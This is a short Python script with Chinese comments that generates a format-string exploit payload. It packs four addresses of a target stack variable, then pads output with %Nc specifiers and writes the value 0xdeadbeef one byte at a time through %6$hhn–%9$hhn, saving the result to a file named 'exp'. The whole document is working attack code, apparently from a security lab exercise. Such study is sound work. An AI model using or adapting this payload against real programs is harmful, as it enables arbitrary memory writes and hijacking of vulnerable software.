#!/usr/bin/env python3

# 目标变量地址
var_addr = 0xffffcf44
# 修改后的目标值
# var_value = 0x66887799
var_value = 0xdeadbeef

payload = b''
num_char = 0

payload += (var_addr+0).to_bytes(4, 'little')
payload += (var_addr+1).to_bytes(4, 'little')
payload += (var_addr+2).to_bytes(4, 'little')
payload += (var_addr+3).to_bytes(4, 'little')
num_char = 16

inc = (0x100 + ((var_value >> 0) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%6$hhn'

inc = (0x100 + ((var_value >> 8) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%7$hhn'

inc = (0x100 + ((var_value >> 16) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%8$hhn'

inc = (0x100 + ((var_value >> 24) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%9$hhn'


with open("exp", "wb") as f:
    f.write(payload)
